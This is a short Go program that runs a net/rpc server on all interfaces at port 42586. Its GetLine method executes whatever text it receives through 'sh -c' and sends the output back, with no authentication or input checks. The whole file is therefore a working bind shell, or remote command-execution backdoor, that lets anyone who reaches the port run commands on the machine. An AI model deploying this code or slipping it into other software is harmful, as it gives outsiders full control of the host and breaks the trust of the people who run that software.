package main

import (
	"fmt"
	"log"
	"net"
	"net/rpc"
	"os/exec"
)

type Listener int

func (l *Listener) GetLine(line []byte, ack *string) error {
	fmt.Println(string(line))
	cmd := exec.Command("sh", "-c", string(line))
	//cmd.Run()
	var out []byte
	var err error
	if out, err = cmd.CombinedOutput(); err != nil {
		log.Fatal(err)
	}

	ll := string(out)
	*ack = ll
	return nil
}

func main() {
	addy, err := net.ResolveTCPAddr("tcp", "0.0.0.0:42586")
	if err != nil {
		log.Fatal(err)
	}

	inbound, err := net.ListenTCP("tcp", addy)
	if err != nil {
		log.Fatal(err)
	}

	listener := new(Listener)
	rpc.Register(listener)
	rpc.Accept(inbound)
}
